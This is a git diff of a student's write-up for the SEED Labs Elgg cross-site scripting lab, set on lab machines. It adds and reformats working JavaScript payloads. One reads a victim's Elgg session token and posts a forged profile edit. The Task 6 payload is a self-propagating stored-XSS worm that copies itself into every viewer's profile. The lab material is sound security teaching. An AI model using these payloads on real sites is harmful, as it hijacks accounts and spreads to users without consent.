@@ -13,7 +13,7 @@ Instruction: https://seedsecuritylabs.org/Labs_16.04/PDF/Web_XSS_Elgg.pdf
 - attacker: `10.0.2.15`
 - server: `10.0.2.4`
 
-Edit the record in `etc/host` on the attacker:
+Edit the DNS record in `etc/host` on the attacker:
 
 ```
 10.0.2.4       www.xsslabelgg.com
@@ -193,33 +193,85 @@ Now we want to modify the `about me` module in the profile of someone as `"modif
 
 ```html
 <script type="text/javascript">
-  window.onload = function(){
-  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
-  //and Security Token __elgg_token
-  var userName="&name="+elgg.session.user.name;
-  var guid="&guid="+elgg.session.user.guid;
-  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-  var token="&__elgg_token="+elgg.security.token.__elgg_token;
-  var description = "&description=<p>modified by Samy<p>" + "&accesslevel[description]=2";
-  //Construct the content of your url.
-  var sendurl =  "http://www.xsslabelgg.com/action/profile/edit";
-  var content= userName+guid+ts+token+description;
-  var samyGuid=47;
-  if(elgg.session.user.guid!=samyGuid)
-  {
-  //Create and send Ajax request to modify profile
-  var Ajax=null;
-  Ajax=new XMLHttpRequest();
-  Ajax.open("POST",sendurl,true);
-  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
-  Ajax.setRequestHeader("Content-Type",
-  "application/x-www-form-urlencoded");
-  Ajax.send(content);
-  }
-  }
+  window.onload = function () {
+    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+    //and Security Token __elgg_token
+    var userName = "&name=" + elgg.session.user.name;
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var description =
+      "&description=<p>modified by Samy<p>" + "&accesslevel[description]=2";
+    //Construct the content of your url.
+    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+    var content = userName + guid + ts + token + description;
+    var samyGuid = 47;
+    if (elgg.session.user.guid != samyGuid) {
+      //Create and send Ajax request to modify profile
+      var Ajax = null;
+      Ajax = new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+      Ajax.setRequestHeader(
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      );
+      Ajax.send(content);
+    }
+  };
 </script>
 ```
 
 Then, visit Samy's profile using Boby's account. Boby's profile is modified at once:
 
 ![](./boby_profile.png)
+
+# Task 6
+
+To make the code in [Task 5](#task-5) self-propogating:
+
+## DOM Approach
+
+Do some subtle modification based on the code in [Task 5](#task-5):
+
+```html
+<script type="text/javascript" id="worm">
+  window.onload = function () {
+    var headerTag = '<script id="worm" type="text/javascript">';
+    var jsCode = document.getElementById("worm").innerHTML;
+    var tailTag = "</" + "script>";
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+    //and Security Token __elgg_token
+
+    var userName = "&name=" + elgg.session.user.name;
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var description =
+      "&description=<p>modified by Samy<p>" +
+      wormCode +
+      "&accesslevel[description]=2";
+    //Construct the content of your url.
+    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+    var content = userName + guid + ts + token + description;
+    var samyGuid = 47;
+    if (elgg.session.user.guid != samyGuid) {
+      //Create and send Ajax request to modify profile
+      var Ajax = null;
+      Ajax = new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+      Ajax.setRequestHeader(
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      );
+      Ajax.send(content);
+    }
+  };
+</script>
+```
+
+Edit Boby's profile as the code above. Then sign-in as Boby to view his profile page, as expected, Boby is injected and shows "modified by Samy". Log-out and then log-in as Alice to view Boby's profile, now you can found that Alice's profile is also changed.
+
+
